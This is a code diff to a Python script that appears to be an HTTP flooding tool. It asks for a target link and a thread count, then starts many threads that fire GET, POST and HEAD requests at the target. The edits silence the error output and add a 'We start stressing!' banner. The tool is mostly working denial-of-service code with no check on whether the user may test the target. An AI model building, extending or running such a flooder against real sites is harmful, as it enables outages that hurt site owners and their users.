@@ -41,8 +41,7 @@ class Main:
     def dataRetrieval(self):
         # Getting the Data
         self.url = input(f"{self.yellow}[?] Provide a link: ")
-        self.threads = input(
-            f"{self.yellow}[?] Specify the number of threads: ")
+        self.threads = input(f"{self.yellow}[?] Specify the number of threads: ")
 
     def checkingData(self):
         if "http" not in self.url:
@@ -64,15 +63,18 @@ class Main:
                 requests.get(self.url, headers=headers)
                 requests.post(self.url, headers=headers)
                 requests.head(self.url, headers=headers)
-                print(f"{self.green}[+] Package sent.\n")
             except:
-                print(f"{self.red}[!] Failed to send a packet.\n")
+                pass
 
     def openingStreams(self):
+        self.clear()
         with IncrementalBar('Opening streams', max=self.threads) as bar:
             for i in range(self.threads):
                 Thread(target=self.flooding).start()
                 bar.next()
+
+        print(f"{self.yellow}[!] We start stressing!\n [!] Press CTRL + Z for stop!")
+
 
     def clear(self):
         try:
